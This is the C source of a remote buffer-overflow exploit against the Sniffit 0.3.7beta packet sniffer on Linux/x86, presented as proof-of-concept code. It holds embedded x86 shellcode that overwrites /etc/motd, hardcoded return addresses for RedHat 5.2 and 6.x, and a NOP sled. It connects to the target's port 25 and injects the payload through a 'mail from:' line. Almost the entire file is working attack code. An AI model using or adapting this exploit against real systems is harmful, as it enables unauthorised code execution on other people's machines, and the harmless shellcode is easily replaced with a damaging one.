/*
 * Sniffit 0.3.7beta Linux/x86 Remote Exploit
 * ShellCode is a modified version of w00w00 write egg, 
 * to pass Sniffit input filter
 *
 * Tested on 	RedHat 5.2, 6.0, 6.2
 * Proof Of Concept Code
 *
 * credits:	|CyraX| for pointing me to the coredump
 *		del0 for hurrying me :)
 *		vecna for offering me drinks ;P
 *		belf for loving and caring his GSM ;P
 * 
 *     			    	     FuSyS [S0ftpj|BFi]
 * 				 http://www.s0ftpj.org/
 */

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<netdb.h>
#include<netinet/in.h>

#define LENGTH		600
#define RET		RH6x
#define RH52		0xbfff5c10
#define RH6x		0xbfff5bb5 	// 0.3.6HIP 0xbfffcc50
#define OFFSET          0
#define ALIGNOP		3		// 3 RH6.0, 4 RH6.2
					// may vary [1-5]


/* Note To Script Kiddies: This ShellCode Simply Changes An
   Existing /etc/motd So Don't Bother DownLoading */

unsigned char shellcode[]=
"\xeb\x03\x5f\xeb\x05\xe8\xf8\xff\xff\xff\x31\xdb\xb3\x35\x01\xfb"
"\x30\xe4\x88\x63\x09\x31\xc9\x66\xb9\x01\x04\x31\xd2\x66\xba\xa4"
"\x01\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x31\xc9\xb1\x3f\x01\xf9\x31"
"\xd2\xb2\x0e\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x2f"
"\x65\x74\x63\x2f\x6d\x6f\x74\x64\x01\x66\x75\x73\x79\x73\x20\x77"
"\x61\x73\x20\x68\x65\x72\x65\x0a";

unsigned long nameResolve(char *hostname)
{
  struct in_addr addr;
  struct hostent *hostEnt;

  if((addr.s_addr=inet_addr(hostname)) == -1) {
    if(!(hostEnt=gethostbyname(hostname))) {
        printf("Name Resolution Error:`%s`\n",hostname);
        exit(0);
    }
    bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
  }
  return addr.s_addr;
}

int main(int argc,char **argv)
{
        char buff[LENGTH+ALIGNOP+1];
	char cmd[610];
        long addr;
        unsigned long sp;
        int offset=OFFSET;
        int i, x;
        int sock;
        struct sockaddr_in sin;

	if(argc<2) {
		fprintf(stderr, "Usage: %s <sniffit host>\n", argv[0]);
		exit(0);
	}

        sp=(unsigned long) RET;
        addr=sp-offset;

	for(i=0;i<120-ALIGNOP;i++)
		buff[i]=0x90;
	for(x=0; x<strlen(shellcode); i++, x++)
		buff[i]=shellcode[x];
	for(i-=1 ; i<LENGTH; i+=4) {
		buff[i  ] =  addr & 0x000000ff;
  		buff[i+1] = (addr & 0x0000ff00) >> 8;
  		buff[i+2] = (addr & 0x00ff0000) >> 16;
  		buff[i+3] = (addr & 0xff000000) >> 24;
 	}

	printf("\nSniffit <=0.3.7beta Linux/x86 Remote Exploit\n");
	printf("by FuSyS [S0ftpj|BFi] - http://www.s0ftpj.org\n\n");

        memset(&sin,0,sizeof(sin));
        sin.sin_family=AF_INET;
        sin.sin_port=htons(25);
        sin.sin_addr.s_addr=nameResolve(argv[1]);

	printf("Connecting to %s ...\n", argv[1]);

        if((sock=socket(AF_INET,SOCK_STREAM,0))<0)
        {
                printf("Can't create socket\n");
                exit(0);
        }
        if(connect(sock,(struct sockaddr *)&sin,sizeof(sin))<0)
        {
                printf("Can't connect to Sniffit Server\n");
                exit(0);
        }

	printf("Injecting ShellCode ...\n");

	strncat(cmd, "mail from:", 10);
	strncat(cmd, buff, strlen(buff));
	write(sock, cmd, strlen(cmd));

	printf("Done!\n\n");

        return(0);
}
